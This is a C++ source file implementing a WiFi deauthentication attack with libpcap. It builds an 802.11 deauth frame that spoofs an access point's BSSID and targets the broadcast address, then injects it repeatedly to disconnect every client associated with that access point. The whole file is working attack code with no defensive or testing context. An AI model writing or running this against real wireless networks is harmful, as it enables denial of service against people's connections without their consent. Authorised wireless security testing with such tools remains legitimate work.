#include "deauth_sender.hpp"
#include <pcap/pcap.h>
#include <cstdio>
#include <cstring>

static bool parse_mac(const std::string& s, uint8_t out[6]) {
    return std::sscanf(s.c_str(),
        "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
        &out[0], &out[1], &out[2], &out[3], &out[4], &out[5]) == 6;
}

bool DeauthSender::send(const std::string& iface,
                        const std::string& bssid,
                        int count)
{
    uint8_t ap[6];
    if (!parse_mac(bssid, ap)) {
        std::fprintf(stderr, "[deauth] invalid BSSID: %s\n", bssid.c_str());
        return false;
    }

    char errbuf[PCAP_ERRBUF_SIZE]{};
    pcap_t* p = pcap_open_live(iface.c_str(), 65535, 1, 100, errbuf);
    if (!p) {
        std::fprintf(stderr, "[deauth] pcap_open_live(%s): %s\n",
                     iface.c_str(), errbuf);
        return false;
    }

    // Minimal radiotap header — 8 bytes, no fields set (driver picks rate/channel)
    static const uint8_t RT[8] = {
        0x00, 0x00,              // version, pad
        0x08, 0x00,              // header length = 8
        0x00, 0x00, 0x00, 0x00  // present bitmap = 0 (no fields)
    };

    // 802.11 deauthentication frame (24-byte header + 2-byte reason)
    //   FC  = 0xC0 0x00  (type=Management, subtype=12=Deauth, toDS=fromDS=0)
    //   Dur = 0x00 0x00
    //   DA  = FF:FF:FF:FF:FF:FF  (broadcast — deauths all associated clients)
    //   SA  = BSSID              (spoofed as the AP)
    //   BSSID = BSSID
    //   Seq = 0x00 0x00
    //   Reason = 0x07 0x00      (reason 7: class-3 frame from non-associated STA)
    uint8_t frame[34];
    memcpy(frame, RT, 8);
    uint8_t* f = frame + 8;
    f[0]  = 0xC0; f[1]  = 0x00;   // Frame Control
    f[2]  = 0x00; f[3]  = 0x00;   // Duration
    memset(f + 4,  0xFF, 6);       // DA: broadcast
    memcpy(f + 10, ap,  6);        // SA: AP BSSID
    memcpy(f + 16, ap,  6);        // BSSID: AP BSSID
    f[22] = 0x00; f[23] = 0x00;   // Sequence Control
    f[24] = 0x07; f[25] = 0x00;   // Reason code

    int sent = 0;
    for (int i = 0; i < count; ++i) {
        if (pcap_inject(p, frame, sizeof(frame)) < 0) {
            std::fprintf(stderr, "[deauth] pcap_inject: %s\n", pcap_geterr(p));
            break;
        }
        ++sent;
    }
    pcap_close(p);

    std::fprintf(stderr, "[deauth] injected %d/%d deauth frame(s)  AP=%s\n",
                 sent, count, bssid.c_str());
    return sent == count;
}
